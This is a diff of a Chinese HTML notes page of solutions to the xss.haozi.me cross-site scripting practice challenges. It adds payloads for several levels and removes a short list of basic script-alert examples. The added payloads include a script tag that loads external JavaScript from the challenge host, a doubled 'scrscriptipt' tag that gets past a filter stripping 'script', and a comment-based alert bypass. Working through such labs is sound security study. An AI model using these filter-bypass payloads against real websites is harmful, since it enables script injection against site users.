@@ -40,17 +40,14 @@
 <div class="clearfix"></div>
 <div id="title">XSS练习</div>
 <div id="content">
-  <h2 id="_1">实验平台</h2>
+  <div class="toc"><span class="toctitle">Table of Contents</span><ul>
+<li><a href="#_1">实验平台</a></li>
+<li><a href="#xss-demo">xss-demo</a></li>
+</ul>
+</div>
+<h2 id="_1">实验平台</h2>
 <p>https://curtails.github.io/xss/<br />
 https://xss.haozi.me</p>
-<h2 id="xss">XSS绕过方法总结</h2>
-<p><code>&lt;scirpt&gt;</code></p>
-<div class="hlcode"><pre><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
-<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
-<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
-</pre></div>
-
-
 <h2 id="xss-demo">xss-demo</h2>
 <p><a href="https://github.com/haozi/xss-demo/">github</a><br />
 <a href="https://xss.haozi.me">在线地址</a></p>
@@ -114,6 +111,36 @@ payload:<code>--!&gt; &lt;script&gt;alert(1)&lt;/script&gt;</code></p>
 </ul>
 <div class="hlcode"><pre><span class="nx">https</span><span class="o">:</span><span class="c1">//www.segmentfault.com.haozi.me/j.js</span>
 </pre></div>
+
+
+<ul>
+<li>0X0b<br />
+标签、域名不区分大小写</li>
+</ul>
+<div class="hlcode"><pre><span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">&quot;https://www.segmentfault.com.haozi.me/j.js&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
+</pre></div>
+
+
+<ul>
+<li>0x0c<br />
+正则替换script为空</li>
+</ul>
+<div class="hlcode"><pre><span class="nt">&lt;scrscriptipt</span> <span class="na">src=</span><span class="s">&quot;https://www.segmentfault.com.haozi.me/j.js&quot;</span><span class="nt">&gt;&lt;/scrscriptipt&gt;</span>
+</pre></div>
+
+
+<ul>
+<li>0x0d<br />
+换行加单行注释绕过</li>
+</ul>
+<div class="hlcode"><pre><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="o">--&gt;</span>
+</pre></div>
+
+
+<ul>
+<li>0x0e</li>
+</ul>
 </div>
 <div id="content-footer">Created in <span class="create-date date"> 2019-10-29 01:01 </span></div>
 
